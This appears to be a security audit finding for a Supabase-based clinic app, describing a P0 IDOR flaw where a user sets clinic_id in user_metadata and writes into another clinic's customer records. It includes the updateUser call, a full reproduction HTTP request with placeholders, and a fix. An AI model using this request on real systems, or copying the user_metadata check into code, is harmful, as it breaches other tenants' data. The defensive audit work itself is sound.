### F-002 — IDOR via user_metadata.clinic_id (Supabase)
### CRITICAL: customers/route.ts:41 reads clinic_id from user.user_metadata.
### user_metadata is USER-WRITABLE by default in Supabase. Attacker:
###  1. signs up legitimately
###  2. calls supabase.auth.updateUser({ data: { clinic_id: '<TARGET-CLINIC-UUID>' } })
###  3. posts to /api/customers with that clinic_id → write succeeds + matches metadata
### → write into ANY clinic's customer table.

### Reproduction (requires authenticated session cookie):
POST http://localhost:3000/api/customers HTTP/1.1
Cookie: <supabase-session-cookies-after-metadata-update>
Content-Type: application/json
X-CSRF-Token: <token-from-cookie>

{
  "name": "ATTACKER",
  "phone": "+97150000000",
  "clinic_id": "<TARGET-CLINIC-UUID>",
  "visit_type": "test"
}

### Expected (buggy): 200 OK { id, created: true } — attacker wrote into victim clinic.
### Defense:
###  - Read clinic_id from app_metadata (admin-only writable), NOT user_metadata.
###  - OR query clinic_members table to authorize.
###  - Same bug exists in src/app/api/roi-report/route.ts:40 — patch both.

### Severity: P0 — CVSS 8.8 (multi-tenant data integrity breach)
